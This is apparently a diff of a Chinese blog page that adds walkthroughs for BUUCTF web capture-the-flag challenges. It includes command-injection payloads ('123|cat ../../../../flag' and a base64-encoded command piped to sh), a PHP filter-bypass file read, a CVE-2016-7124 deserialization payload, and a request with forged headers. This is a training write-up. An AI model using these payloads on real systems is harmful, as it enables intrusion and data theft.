@@ -179,7 +179,22 @@
 <meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201109194054925.png">
 <meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201109194127576.png">
 <meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201109194602514.png">
-<meta property="og:updated_time" content="2020-11-09T11:46:32.630Z">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201110220526310.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201110220712407.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201110220951863.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201110221327620.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201111173214101.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201112152241674.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201112152304644.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201113214722442.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118212526526.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118213222658.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118214105813.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118214112544.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118214151473.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118214306684.png">
+<meta property="og:image" content="https://www.s1lenc3.com/2020/11/09/buuctf-web-1/image-20201118214420371.png">
+<meta property="og:updated_time" content="2020-11-18T13:46:19.103Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-web-1">
 <meta name="twitter:description" content="Secret File 查看源代码：   点secret，什么都没发现，但是action.php变为了end.php，应该有重定向，抓包看看，  然后访问这个页面，得到源码。  想到可以通过伪协议读取flag。 secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php 将得到的base64编码进行解码，  I">
@@ -491,12 +506,24 @@
                 
               
 
-              <time title="创建时间：2020-11-09 11:52:31 / 修改时间：19:46:32" itemprop="dateCreated datePublished" datetime="2020-11-09T11:52:31+08:00">2020-11-09</time>
+              <time title="创建时间：2020-11-09 11:52:31" itemprop="dateCreated datePublished" datetime="2020-11-09T11:52:31+08:00">2020-11-09</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-11-18 21:46:19" itemprop="dateModified" datetime="2020-11-18T21:46:19+08:00">2020-11-18</time>
               
             
           </span>
@@ -556,7 +583,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.2k</span>
+                <span title="本文字数">2.3k</span>
               
 
               
@@ -570,7 +597,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">2 分钟</span>
               
             </div>
           
@@ -650,6 +677,48 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/11/09/buuctf-web-1/image-20201109194602514.png" alt="image-20201109194602514"></p>
+<h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>源码泄露，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220526310.png" alt="image-20201110220526310"></p>
+<p>然后发现字符被过滤了，使用php解析字符串的特性绕过，问号后边加空格。</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220712407.png" alt="image-20201110220712407"></p>
+<p>读取目录，但是单引号被过滤了，使用如下payload：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220951863.png" alt="image-20201110220951863"></p>
+<p>读取f1agg文件，</p>
+<p><code>? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110221327620.png" alt="image-20201110221327620"></p>
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><h3 id><a href="#" class="headerlink" title></a></h3><p>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123|cat <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/09/buuctf-web-1/image-20201111173214101.png" alt="image-20201111173214101"></p>
+<h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p><img src="/2020/11/09/buuctf-web-1/image-20201112152241674.png" alt="image-20201112152241674"></p>
+<p>连接一句话马，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201112152304644.png" alt="image-20201112152304644"></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>通过尝试，找到了<a href="http://www.zip备份目录，审计源码。" target="_blank" rel="noopener">www.zip备份目录，审计源码。</a></p>
+<p>反序列化学习：<a href="https://www.jianshu.com/p/1d2c65601d2a" target="_blank" rel="noopener">https://www.jianshu.com/p/1d2c65601d2a</a></p>
+<p>输出flag的是class.php：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201113214722442.png" alt="image-20201113214722442"></p>
+<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
+<p>绕过wakeup方法：</p>
+<p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
+<p>所以可以构造exp：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118212526526.png" alt="image-20201118212526526"></p>
+<p>将属性值2改为大于2的就可以了。因为有不可打印字符，所以我们对\0进行url编码。</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118213222658.png" alt="image-20201118213222658"></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>访问secret.php：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214105813.png" alt="image-20201118214105813"></p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214112544.png" alt="image-20201118214112544"></p>
+<p>我们设置referer试试，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214151473.png" alt="image-20201118214151473"></p>
+<p>再设置user-agent：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214306684.png" alt="image-20201118214306684"></p>
+<p>本地只读，伪造ip：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214420371.png" alt="image-20201118214420371"></p>
+<p>拿到flag</p>
+<p>http请求包：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/Secret.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> node3.buuoj.<span class="string">cn:</span><span class="number">26085</span></span><br><span class="line">Proxy-<span class="string">Connection:</span> keep-alive</span><br><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//www.Sycsecret.com</span></span><br><span class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Syclover</span><br><span class="line">X-Forwarded-<span class="string">For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> UM_distinctid=<span class="number">175</span>b7bc59d4266<span class="number">-032275</span>eb541e94<span class="number">-4353760</span><span class="number">-144000</span><span class="number">-175</span>b7bc59d5358</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -762,6 +831,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2020/11/11/加壳与脱壳/" rel="prev" title="加壳与脱壳">
+                加壳与脱壳 <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -831,7 +904,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-count">20</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -976,7 +1049,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Secret-File"><span class="nav-number">1.</span> <span class="nav-text">Secret File</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Include1"><span class="nav-number">2.</span> <span class="nav-text">Include1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LoveSQL"><span class="nav-number">3.</span> <span class="nav-text">LoveSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">easy_tornado</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ping-Ping-Ping"><span class="nav-number">5.</span> <span class="nav-text">Ping Ping Ping</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Secret-File"><span class="nav-number">1.</span> <span class="nav-text">Secret File</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Include1"><span class="nav-number">2.</span> <span class="nav-text">Include1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LoveSQL"><span class="nav-number">3.</span> <span class="nav-text">LoveSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">easy_tornado</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ping-Ping-Ping"><span class="nav-number">5.</span> <span class="nav-text">Ping Ping Ping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Easy-Calc1"><span class="nav-number">6.</span> <span class="nav-text">Easy Calc1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exec"><span class="nav-number">7.</span> <span class="nav-text">Exec</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">7.0.1.</span> <span class="nav-text"></span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#Knife"><span class="nav-number">8.</span> <span class="nav-text">Knife</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP"><span class="nav-number">9.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Http"><span class="nav-number">10.</span> <span class="nav-text">Http</span></a></li></div>
             
 
           </div>
@@ -1016,7 +1089,7 @@
       <i class="fa fa-area-chart"> 站点字数合计:</i>
     </span>
     
-    <span title="站点总字数">46k</span>
+    <span title="站点总字数">47k</span>
   
   
 </div>
